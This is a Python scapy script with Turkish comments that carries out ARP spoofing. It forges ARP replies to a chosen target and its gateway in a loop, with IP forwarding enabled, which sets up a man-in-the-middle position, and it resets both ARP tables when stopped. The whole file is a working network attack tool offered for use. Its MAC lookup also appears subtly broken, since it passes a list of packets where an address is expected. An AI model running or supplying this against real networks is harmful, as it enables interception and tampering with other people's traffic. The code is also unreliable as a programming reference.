# - * - coding: UTF - 8 -*-
import scapy.all as sc
import optparse as opt
from İp_forwad import ip_forwarding
import time


# Target mac addres alma
def get_mac_addrees(ip):
    arp_request_packet = sc.ARP(pdst=ip)
    # scapy.ls(scapy.ARP())
    broadcast_packet = sc.Ether(dst="ff:ff:ff:ff:ff:ff")
    # scapy.ls(scapy.Ether())
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = sc.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list

# Kullanıcıdan input alma
def get_user_input():
    parse_object = opt.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")

    options = parse_object.parse_args()[0]

    if not options.target_ip:
        print("Enter Target IP")
    if not options.gateway_ip:
        print("Enter Gateway IP")

    return options


# Arp zehirlemesi
def arp_poisoning(target_ip, poisoned_ip):
    target_mac = get_mac_addrees(target_ip)
    arp_response = sc.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    sc.send(arp_response, verbose=False)

    # sc.ls(sc.ARP())

#ARP -a tablosu resetleme
def reset(fooled_ip, gateway_ip):
    fooled_mac = get_mac_addrees(fooled_ip)
    gateway_mac = get_mac_addrees(gateway_ip)

    arp_response = sc.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip,hwsrc=gateway_mac)
    sc.send(arp_response, verbose=False,count=6)



user_ips= get_user_input()
user_target_ip=user_ips.target_ip
user_gateway_ip=user_ips.gateway_ip
ip_forwarding()
try:
     while True:
        arp_poisoning(user_target_ip,user_gateway_ip)
        arp_poisoning(user_gateway_ip,user_target_ip)
        time.sleep(8)
        print("Sending packets")
except KeyboardInterrupt:
    print("\n Quit & Reset")
    reset(user_target_ip, user_gateway_ip)
    reset(user_gateway_ip, user_target_ip)

